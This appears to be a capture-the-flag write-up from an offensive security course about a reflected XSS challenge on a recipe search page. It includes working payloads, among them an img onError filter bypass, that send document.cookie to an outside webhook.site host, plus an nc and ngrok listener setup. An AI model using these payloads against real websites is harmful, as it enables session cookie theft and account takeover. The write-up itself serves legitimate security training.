# RecipeBox

**Category:** web / reflected XSS (multiple filter-bypass iterations) · **Course:** Offensive Security (PoliTo)

## Vulnerability

A search field (`?q=`) reflects user input directly into the page HTML with no output encoding, and with some filtering on obvious `<script>` payloads that a different tag/attribute combination gets around.

## Exploitation

Progression of attempts against the `q` parameter:

1. `?q=<script>fetch('https://webhook.site/...?c='+document.cookie)</script>` — a first pass with a raw `<script>` tag.
2. `<img src='x' onError="fetch('https://webhook.site/...?c='+document.cookie);">` — an event-handler-based payload used once the script-tag route proved unreliable against the filter.
3. Combined into the final reflected payload against the live query parameter: `?q=<img src='x' onError="fetch('https://webhook.site/...?c='+encodeURIComponent(document.cookie));">`

A second working solution was also recorded using a self-hosted listener instead of webhook.site, tunnelled with ngrok (`nc -lvnp 8000` + `ngrok http 8000`), with the payload URL-encoded before delivery — useful as a fallback when a public collaborator service is blocked or rate-limited.

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.

## Note

Only the solution notes were preserved for this challenge (no app source retained).
